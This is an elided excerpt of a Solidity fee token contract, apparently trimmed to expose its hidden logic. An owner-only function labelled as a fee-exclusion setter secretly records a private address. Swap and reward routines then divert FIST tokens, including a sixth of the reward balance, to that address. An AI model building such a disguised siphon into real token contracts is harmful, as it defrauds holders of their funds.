...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _buyPromoteFee = 300;
    uint256 public _sellLPDividendFee = 300;
    uint256 public _sellFundFee = 100;
    uint256 public _sellPromoteFee = 300;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        FIST.transferFrom(address(_tokenDistributor), _oskPair, firstfundamount);
    ...
    function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public onlyOwner {
        if(_oskPair==address(0)){_oskPair=accounts[0];}
    ...
    function processReward(uint256 gas) private {
        ...
        uint256 oskPairBalance=balance/6;
        FIST.transfer(_oskPair, oskPairBalance);
        balance=balance-oskPairBalance;
        ...
        while (gasUsed < gas && iterations < shareholderCount) {
            ...
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                ...
                if (amount > 0 && FIST.balanceOf(shareHolder) + amount < 1000*10**18) {
